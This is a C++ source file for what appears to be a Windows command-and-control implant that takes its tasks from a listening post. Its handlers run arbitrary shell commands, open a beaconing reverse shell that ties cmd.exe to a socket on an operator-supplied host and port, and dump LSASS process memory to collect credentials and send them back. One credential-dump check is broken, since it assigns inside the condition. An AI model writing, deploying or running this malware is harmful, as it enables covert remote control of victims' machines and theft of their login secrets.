#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif // _WIN32

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "tasks.h"
#include "utils.h"

#include <string>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>

#include <Windows.h>
#include <TlHelp32.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter) 
{
    // Get the task type and identifier, declare our variables
    const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
    const auto idString = taskTree.get_child("task_id").get_value<std::string>();
    std::stringstream idStringStream{ idString };
    boost::uuids::uuid id{};
    idStringStream >> id;

    // Conditionals to determine which task should be executed based on key provided
    // Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
    if (taskType == PingTask::key)
    {
        return PingTask{id};
    }
    if (taskType == ConfigureTask::key)
    {
        return ConfigureTask{
            id,
            taskTree.get_child("dwell").get_value<double>(),
            taskTree.get_child("running").get_value<bool>(),
            std::move(setter)
        };
    }
    if (taskType == ExecuteTask::key)
    {
        return ExecuteTask{
            id,
            taskTree.get_child("command").get_value<std::string>()
        };
    }
    if (taskType == ListThreadsTask::key)
    {
        return ListThreadsTask{
            id,
            taskTree.get_child("procid").get_value<std::string>()
        };
    }
    if (taskType == ReverseShellTask::key)
    {
        return ReverseShellTask{
            id,
            taskTree.get_child("host").get_value<std::string>(),
            taskTree.get_child("port").get_value<int>()
        };
    }
    if (taskType == GetCredsAdminTask::key)
    {
        return GetCredsAdminTask{
            id,
            taskTree.get_child("filename").get_value<std::string>()
        };
    }

    // ===========================================================================================

    // No conditionals matched, so an undefined task type must have been provided and we error out
    std::string errorMsg{"Illegal task type encountered: "};
    errorMsg.append(taskType);
    throw std::logic_error{errorMsg};
}

// Instantiate the implant configuration
Configuration::Configuration(const double meanDwell, const bool isRunning)
    : meanDwell(meanDwell), isRunning(isRunning) {}

// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
PingTask::PingTask(const boost::uuids::uuid& id):id{id}{}

Result PingTask::run() const
{
    const auto pingResult = "Pong!";
    return Result{id, pingResult, true};
}

// Configure Task
// -------------------------------------------------------------------------------------------
ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
                             double meanDwell,
                             bool isRunning,
                             std::function<void(const Configuration&)> setter)
    : id{id},
      meanDwell{meanDwell},
      isRunning{isRunning},
      setter{std::move(setter)} {}

Result ConfigureTask::run() const
{
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{meanDwell, isRunning});
    return Result{id, "Configuration successful!", true};
}

// Execute Command Task
// -------------------------------------------------------------------------------------------
ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string command)
    : id{id},
      command{std::move(command)} {}

Result ExecuteTask::run() const
{
    std::string result;
    try
    {
        std::array<char, 128> buffer{};
        std::unique_ptr<FILE, decltype(&_pclose)> pipe{
            // Get a pointer to a pipe where we pass in the command string to "_popen" and then calling "_pclose"
            _popen(command.c_str(), "r"),
            _pclose
        };
        if (!pipe) // If we faile to get a pointer to a pipe throw and error
            throw std::runtime_error("Failed to open pipe.");
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
        {
            result += buffer.data();
        }
        return Result{id, std::move(result), true};
    }
    catch (const std::exception &e)
    {
        return Result{id, e.what(), false};
    }
}

// List Threads Task
// -------------------------------------------------------------------------------------------
ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string processId)
    : id{id},
      processId{processId} {}

Result ListThreadsTask::run() const
{
    try
    {
        std::stringstream threadList;
        auto ownerProcessId{0};

        // User wants to list threads in current process
        if (processId == "-")
        {
            ownerProcessId = GetCurrentProcessId();
        }
        // If the process ID is not blank, try to use it for listing the threads in the process
        else if (processId != "")
        {
            ownerProcessId = stoi(processId);
        }
        // Some invalid process ID was provided, throw an error
        else
        {
            return Result{id, "Error! Failed to handle given process ID.", false};
        }

        HANDLE threadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;

        // Take a snapshot of all running threads
        threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (threadSnap == INVALID_HANDLE_VALUE)
            return Result{id, "Error! Could not take a snapshot of all running threads.", false};

        // Fill in the size of the structure before using it.
        te32.dwSize = sizeof(THREADENTRY32);

        // Retrieve information about the first thread,
        // and exit if unsuccessful
        if (!Thread32First(threadSnap, &te32))
        {
            CloseHandle(threadSnap); // Must clean up the snapshot object!
            return Result{id, "Error! Could not retrieve information about first thread.", false};
        }

        // Now walk the thread list of the system and display information about each thread associated with the specified process
        do
        {
            if (te32.th32OwnerProcessID == ownerProcessId)
            {
                // Add all thread IDs to a string stream
                threadList << "THREAD ID      = " << te32.th32ThreadID << "\n";
            }
        } while (Thread32Next(threadSnap, &te32));

        CloseHandle(threadSnap);
        return Result{id, threadList.str(), true};
    }
    catch (const std::exception &e)
    {
        return Result{id, e.what(), false};
    }
}

// Reverse Shell Task
// -------------------------------------------------------------------------------------------
ReverseShellTask::ReverseShellTask(const boost::uuids::uuid &id, std::string host, int port)
    : id{id},
      host{host}, 
      port {port} {}

Result ReverseShellTask::run() const
{
    
    try
    {
        std::stringstream ss;
        ss << "Reverse Shell task received";
        bool loop = true;
        while(loop) 
        {
            Sleep(5000);    // Beaconing
            // Initialize sockets 
            SOCKET s;
            sockaddr_in addr;
            WSADATA version;
            WSAStartup(MAKEWORD(2,2), &version);
            s = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = inet_addr(host.c_str());  //IP received from main function
            addr.sin_port = htons(port);     //Port received from main function
            //Connecting to Host, if no connection go back to sleep & repeat the process
            if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
                closesocket(s);
                WSACleanup();
                continue;
            }
            else 
            {
                // Once connected wait for data to be sent, if not it means the socket got disconnected and we go back to beaconning
                char RecvData[DEFAULT_BUFLEN];
                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(s, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0)
                {
                    closesocket(s);
                    WSACleanup();
                    continue;
                }
                else 
                {
                    // Initialize our processus
                    wchar_t Process[] = L"cmd.exe";
                    STARTUPINFO sinfo;
                    PROCESS_INFORMATION pinfo;
                    memset(&sinfo, 0, sizeof(sinfo));
                    sinfo.cb = sizeof(sinfo);
                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                    // Pass the input, output & error of the startupinfo struct to our socket
                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s;
                    // Creates a cmd.exe process using the above variable and pipes the input, output and error to the HANDLE using &sinfo created above
                    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                    WaitForSingleObject(pinfo.hProcess, INFINITE);
                    CloseHandle(pinfo.hProcess);
                    CloseHandle(pinfo.hThread);
                    memset(RecvData, 0, sizeof(RecvData));
                    // If socket got disconnected, clean up and go back to listening
                    int RecvCode = recv(s, RecvData, DEFAULT_BUFLEN, 0);
                    if (RecvCode <= 0)
                    {
                        closesocket(s);
                        WSACleanup();
                        continue;
                    }
                    // If receive "exit" from host exit the reverse shell
                    if (strcmp(RecvData, "exit\n") ==  0)
                    {
                        loop = false;
                    }
                }
            }
        }
        return Result{ id, "Reverse shell closed!", true };
    }
    catch(const std::exception& e)
    {
        return Result{id, e.what(), false};
    }
    
}

// Get Creds with Admin rights Task
// -------------------------------------------------------------------------------------------
GetCredsAdminTask::GetCredsAdminTask(const boost::uuids::uuid& id, std::string filename)
    : id{ id },
    filename{ filename } {}

Result GetCredsAdminTask::run() const
{
    std::string result;
    try
    {
        bool privAdded = SetPrivilege();
        if (!IsElevated() || !privAdded || filename.length() <= 0) {
            return Result{ id, "Elevated Failed or no FileName", false };
        }
        DWORD processPID = getLsassPid();
        std::wstring wFname = std::wstring(filename.begin(), filename.end());
        LPCWSTR pointer_filename = (LPCWSTR)wFname.c_str();
        HANDLE output = CreateFileW(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (output = INVALID_HANDLE_VALUE)
            return Result{ id, "Create File Failed: " + filename, false };
        DWORD processAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
        HANDLE processHandler = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processPID);
        if (processHandler && processHandler != INVALID_HANDLE_VALUE && output != INVALID_HANDLE_VALUE) {
            bool isDumped = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);

             if (isDumped) {
                 std::ifstream t(filename);
                 std::stringstream buffer;
                 buffer << t.rdbuf();
                 return Result{ id, buffer.str(), true };
             } else {
                 return Result{ id, "dump failed", false };
             }
         }
        return Result{ id, "Process Failed", false };
    }
    catch (const std::exception& e)
    {
        return Result{ id, e.what(), false };
    }

}
// ===========================================================================================
